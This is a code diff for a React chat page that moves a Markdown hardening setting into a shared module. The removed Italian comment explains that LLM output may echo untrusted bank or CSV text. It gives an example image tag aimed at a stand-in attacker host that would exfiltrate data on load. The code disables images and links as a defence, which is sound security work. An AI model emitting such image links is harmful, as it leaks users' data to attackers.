@@ -1,4 +1,4 @@
-import { useEffect, useRef, useState, type ReactNode } from 'react';
+import { useEffect, useRef, useState } from 'react';
 import { useMutation, useQuery, useQueryClient } from '@tanstack/react-query';
 import ReactMarkdown from 'react-markdown';
 import { Plus, Send, Trash2, MessageSquare, AlertCircle, Loader2 } from 'lucide-react';
@@ -11,6 +11,7 @@ import { chatApi, type ChatMessage } from './chatApi';
 import { useChatStream, type ChatWorking } from './useChatStream';
 import { llmApi } from '@/features/settings/llmApi';
 import { useConfirm } from '@/components/shared/confirm';
+import { MARKDOWN_COMPONENTS } from '@/components/shared/markdown';
 
 export function ChatPage() {
   const queryClient = useQueryClient();
@@ -339,18 +340,6 @@ function formatElapsed(seconds: number): string {
   const s = seconds % 60;
   return `${m}m ${String(s).padStart(2, '0')}s`;
 }
-
-/**
- * Hardening del Markdown della risposta LLM: il modello può aver letto testo
- * non fidato (causali bancarie, descrizioni importate da CSV), quindi immagini
- * e link vengono neutralizzati — un `![](https://attaccante/?dati)` renderizzato
- * esfiltrerebbe dati al solo caricamento, e un link cliccabile è phishing.
- * Le immagini spariscono, i link restano come testo inerte.
- */
-const MARKDOWN_COMPONENTS = {
-  img: () => null,
-  a: ({ children }: { children?: ReactNode }) => <span className="underline">{children}</span>,
-};
 
 function MessageBubble({ message, streaming }: { message: ChatMessage; streaming?: boolean }) {
   const isUser = message.role === 'user';
